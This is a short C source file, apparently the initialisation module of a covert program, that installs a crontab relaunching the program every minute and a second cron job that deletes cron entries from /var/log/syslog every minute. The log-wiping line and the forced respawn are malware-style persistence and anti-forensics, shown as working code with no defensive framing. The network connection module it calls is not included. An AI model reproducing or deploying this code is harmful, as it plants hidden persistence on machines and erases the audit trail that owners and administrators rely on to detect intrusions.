//
// Created by cmtheit on 23-6-1.
//

#include "init.h"
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <sys/wait.h>
#include "../connection/connection.h"

// 在 crontab 中添加每分钟重启本程序的命令
void init_crontab(const char ** argv) {
    char buf[1024] = {0};
    getcwd(buf, 1024);      // 获取当前工作目录
    pid_t pid;
    int pipefd[2];
    pipe(pipefd);
    if ((pid = fork())) {
        close(pipefd[0]);
        char task[1024] = {0};
        sprintf(task,
                "* * * * * cd %s && %s\n"
                  "* * * * * /bin/sed -i /cron/Id /var/log/syslog\n",
            buf, argv[0]);
        write(pipefd[1], task, strlen(task));
        close(pipefd[1]);
        int stat;
        waitpid(pid, &stat, 0);
        // crontab 自动任务添加完毕
    } else {
        // 执行写入操作
        close(pipefd[1]);
        dup2(pipefd[0], STDIN_FILENO);
        execl("/bin/crontab", "/bin/crontab", NULL);
    }
}

void init_connection() {
    connection_init();
}

void init(const char ** argv) {
    init_crontab(argv);
    init_connection();
}